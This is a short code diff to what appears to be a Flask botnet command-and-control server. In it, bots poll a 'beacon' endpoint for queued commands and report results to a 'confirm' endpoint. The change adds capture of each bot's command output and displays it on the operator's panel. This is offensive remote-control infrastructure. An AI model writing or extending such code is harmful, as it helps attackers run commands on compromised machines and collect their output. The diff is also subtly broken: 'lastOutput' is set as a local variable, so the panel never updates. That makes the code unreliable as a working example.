@@ -21,6 +21,8 @@ def login(username, password):
         return check_password_hash(users.get(username), password)
     return False
 
+
+lastOutput = ''
 """
 Function: index
 Parameters: None
@@ -37,7 +39,7 @@ def index():
 	for bot in bots:
 		if bot not in botLst and bot != None:
 			botLst.append(bot)		
-	return render_template('form.html', command=command, botIP=botIP, bots=botLst)
+	return render_template('form.html', command=command, botIP=botIP, bots=botLst, lastOutput=lastOutput)
 
 
 """
@@ -53,7 +55,7 @@ def beacon():
 		bots[ip] = []
 	else:
 		return json.dumps(bots[ip])
-	return json.dumps('0')
+	return json.dumps('')
 		
 """
 Function: confirm
@@ -68,6 +70,8 @@ Description: Page for bot to send confirmation to after executing commands
 def confirm():
 	ip = request.args.get('ip')
 	cmd = request.args.get('cmd')
+	output = request.args.get('output')
+	lastOutput = output
 	#Recieve commands executed and remove them from the queue
 	if cmd in bots[ip]:
 		bots[ip].remove(cmd)
